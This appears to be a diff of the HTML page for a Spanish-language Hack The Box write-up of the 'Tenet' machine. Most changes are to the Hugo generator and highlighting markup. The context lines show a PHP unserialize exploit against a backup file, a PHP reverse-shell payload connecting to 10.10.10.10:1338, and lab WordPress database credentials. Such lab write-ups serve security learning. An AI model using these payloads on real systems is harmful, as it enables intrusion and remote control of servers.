@@ -1256,7 +1256,7 @@
     <meta property="twitter:description" content="Tenet es presentada con dificultad media, la enumeracion en wordpress  nos llevo al codigo fuente de una pagina la cual fue vulnerada mediante un objeto serializado. Se utilizaron las credenciales en archivos de configuracion para realizar movimiento lateral. Un pequeño script para la escritura de nuestra clave privada en un archivo temporal proporciono una shell root.">
   
 
-<meta name="generator" content="Hugo 0.68.3" />
+<meta name="generator" content="Hugo 0.80.0" />
 <meta name="msapplication-TileColor" content="#1d1d1d">
 
 <meta name="theme-color" content="#1d1d1d">
@@ -1584,22 +1584,22 @@
   🏷️
   
 
+  <li><a href="https://sckull.github.io/tags/wpscan/" class="single__tag" title="wpscan">wpscan</a></li>
+  
+
+  <li><a href="https://sckull.github.io/tags/wordpress/" class="single__tag" title="wordpress">wordpress</a></li>
+  
+
+  <li><a href="https://sckull.github.io/tags/unserialize/" class="single__tag" title="unserialize">unserialize</a></li>
+  
+
   <li><a href="https://sckull.github.io/tags/php/" class="single__tag" title="php">php</a></li>
   
 
   <li><a href="https://sckull.github.io/tags/sudo/" class="single__tag" title="sudo">sudo</a></li>
   
 
-  <li><a href="https://sckull.github.io/tags/wordpress/" class="single__tag" title="wordpress">wordpress</a></li>
-  
-
-  <li><a href="https://sckull.github.io/tags/wpscan/" class="single__tag" title="wpscan">wpscan</a></li>
-  
-
   <li><a href="https://sckull.github.io/tags/bash-script/" class="single__tag" title="bash script">bash script</a></li>
-  
-
-  <li><a href="https://sckull.github.io/tags/unserialize/" class="single__tag" title="unserialize">unserialize</a></li>
   
 
 </ul>
@@ -1914,7 +1914,7 @@ Interesting Finding<span class="o">(</span>s<span class="o">)</span>:
 <span class="o">[]</span> Database updated &lt;br&gt;
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="php-unserialize---rce-">PHP UNSERIALIZE - RCE</h2>
+</div><h2 id="php-unserialize---rce">PHP UNSERIALIZE - RCE</h2>
 <p>Neil habla de un backup pero no especifíca de que archivo/software/db, aunque menciona <code>sator.php</code>, agregamos la extension de un backup (<code>bak</code>) al archivo <code>sator.php.bak</code> y logramos obtener el codigo fuente.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1949,7 +1949,7 @@ Interesting Finding<span class="o">(</span>s<span class="o">)</span>:
 </span><span class="lnt">29
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 
 <span class="k">class</span> <span class="nc">DatabaseExport</span>
 <span class="p">{</span>
@@ -1977,8 +1977,8 @@ Interesting Finding<span class="o">(</span>s<span class="o">)</span>:
 <span class="nv">$app</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DatabaseExport</span><span class="p">;</span>
 <span class="nv">$app</span> <span class="o">-&gt;</span> <span class="na">update_db</span><span class="p">();</span>
 
-<span class="cp">?&gt;</span>
-</code></pre></td></tr></table>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></td></tr></table>
 </div>
 </div><p>Al analizar el codigo, observamos una variable que obtiene el valor pasado al parametro <code>arepo</code> por medio de una solicitud GET, este valor es <em>unserializado</em> (<code>unzerialize($_GET['arepo'])</code>), por ultimo se crea un objeto del tipo <code>DatabaseExport()</code> y realiza la ejecucion de la funcion <code>update_db()</code>. Sabiendo lo anterior vamos a enfocarnos en la funcion <code>unserialize()</code> ya que si se le pasa un valor serializado este puede ser ejecutado como se indica en la documentacion de <a href="https://www.php.net/manual/es/function.unserialize.php">php</a>.<br />
 <div class="alert alert-info" role="alert" data-dir="ltr">Advertencia: &hellip; La deserialización puede resultar en que el código sea cargado y ejecutado debido a la instanciación y autocarga de objetos, y un usuario malicioso podría ser capaz de explotar este comportamiento. &hellip;</div>
@@ -1998,7 +1998,7 @@ Interesting Finding<span class="o">(</span>s<span class="o">)</span>:
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="k">class</span> <span class="nc">DatabaseExport</span>
 <span class="p">{</span>
 	<span class="k">public</span> <span class="nv">$user_file</span> <span class="o">=</span> <span class="s1">&#39;batman.php&#39;</span><span class="p">;</span>
@@ -2007,8 +2007,8 @@ Interesting Finding<span class="o">(</span>s<span class="o">)</span>:
 
 <span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">DatabaseExport</span><span class="p">));</span>
 
-<span class="cp">?&gt;</span>
-</code></pre></td></tr></table>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -2052,7 +2052,7 @@ knock knock
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="p">[</span><span class="o">...</span> <span class="nx">REDACTED</span> <span class="o">...</span><span class="p">]</span>
 <span class="nv">$data</span> <span class="o">=</span> <span class="s1">&#39;&lt;?php $sock=fsockopen(&#34;10.10.10.10&#34;,1338);$proc=proc_open(&#34;/bin/sh -i&#34;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);echo &#34;hi&#34; ?&gt;&#39;</span><span class="p">;</span>
 </code></pre></td></tr></table>
@@ -2116,23 +2116,23 @@ www-data@tenet:/var/www/html$
 </span><span class="lnt">17
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">/** MySQL database username */                                                 
-define( &#39;DB_USER&#39;, &#39;neil&#39; );
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="sd">/** MySQL database username */</span>                                                 
+<span class="nx">define</span><span class="p">(</span> <span class="s1">&#39;DB_USER&#39;</span><span class="p">,</span> <span class="s1">&#39;neil&#39;</span> <span class="p">);</span>
 
-/** MySQL database password */
-define( &#39;DB_PASSWORD&#39;, &#39;Opera2112&#39; );
+<span class="sd">/** MySQL database password */</span>
+<span class="nx">define</span><span class="p">(</span> <span class="s1">&#39;DB_PASSWORD&#39;</span><span class="p">,</span> <span class="s1">&#39;Opera2112&#39;</span> <span class="p">);</span>
 
-/** MySQL hostname */
-define( &#39;DB_HOST&#39;, &#39;localhost&#39; );
+<span class="sd">/** MySQL hostname */</span>
+<span class="nx">define</span><span class="p">(</span> <span class="s1">&#39;DB_HOST&#39;</span><span class="p">,</span> <span class="s1">&#39;localhost&#39;</span> <span class="p">);</span>
 
-/** Database Charset to use in creating database tables. */
-define( &#39;DB_CHARSET&#39;, &#39;utf8mb4&#39; );
+<span class="sd">/** Database Charset to use in creating database tables. */</span>
+<span class="nx">define</span><span class="p">(</span> <span class="s1">&#39;DB_CHARSET&#39;</span><span class="p">,</span> <span class="s1">&#39;utf8mb4&#39;</span> <span class="p">);</span>
 
-/** The Database Collate type. Don&#39;t change this if in doubt. */
-define( &#39;DB_COLLATE&#39;, &#39;&#39; );
+<span class="sd">/** The Database Collate type. Don&#39;t change this if in doubt. */</span>
+<span class="nx">define</span><span class="p">(</span> <span class="s1">&#39;DB_COLLATE&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span> <span class="p">);</span>
 
-define( &#39;WP_HOME&#39;, &#39;http://tenet.htb&#39;); 
-define( &#39;WP_SITEURL&#39;, &#39;http://tenet.htb&#39;);
+<span class="nx">define</span><span class="p">(</span> <span class="s1">&#39;WP_HOME&#39;</span><span class="p">,</span> <span class="s1">&#39;http://tenet.htb&#39;</span><span class="p">);</span> 
+<span class="nx">define</span><span class="p">(</span> <span class="s1">&#39;WP_SITEURL&#39;</span><span class="p">,</span> <span class="s1">&#39;http://tenet.htb&#39;</span><span class="p">);</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>Verificamos que este mismo usuario exista en la maquina y tenga acceso en la maquina.</p>
@@ -3786,7 +3786,7 @@ var a = document.getElementsByClassName('navbar__menu-item')
     <li><a href="#wordpress">WORDPRESS</a>
       <ul>
         <li><a href="#wpscan">WPSCAN</a></li>
-        <li><a href="#php-unserialize---rce-">PHP UNSERIALIZE - RCE</a></li>
+        <li><a href="#php-unserialize---rce">PHP UNSERIALIZE - RCE</a></li>
       </ul>
     </li>
     <li><a href="#www-data---user">WWW-DATA - USER</a></li>
